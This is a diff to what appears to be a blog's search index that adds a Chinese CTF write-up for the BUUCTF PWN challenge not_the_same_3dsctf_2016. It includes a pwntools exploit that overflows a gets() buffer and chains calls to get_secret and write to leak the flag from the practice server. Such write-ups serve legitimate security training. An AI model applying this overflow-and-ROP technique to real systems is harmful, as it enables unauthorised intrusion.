@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>BUUCTF-PWN-not_the_same_3dsctf_2016</title>
+      <link href="/20211205-ctf-nts32/"/>
+      <url>/20211205-ctf-nts32/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-not-the-same-3dsctf-2016"><a href="#BUUCTF-PWN-not-the-same-3dsctf-2016" class="headerlink" title="BUUCTF-PWN-not_the_same_3dsctf_2016"></a>BUUCTF-PWN-not_the_same_3dsctf_2016</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112052145850.png" alt="image-20211205214443908"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112052147985.png" alt="image-20211205214701698"></p><p>main函数中的gets函数可以溢出</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112052147954.png" alt="image-20211205214734613"></p><p>这个函数读取了flag，并存入到变量<code>fl4g</code>中，且其在bss段，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112052147749.png" alt="image-20211205214755583"></p><p>那么我们只需要使<code>get_secret()</code>函数运行，然后再利用write函数将flag写出就行了</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29733</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./nts32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_fl4g = <span class="number">0x080eca2d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span>) + p32(<span class="number">0x080489A0</span>) + p32(write) + p32(bss_fl4g) + p32(<span class="number">1</span>) + p32(bss_fl4g) + p32(<span class="number">45</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202112052152464.png" alt="image-20211205215237829"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>基于高德地图API可视化PM2.5指数</title>
       <link href="/20211203-js-map/"/>
       <url>/20211203-js-map/</url>
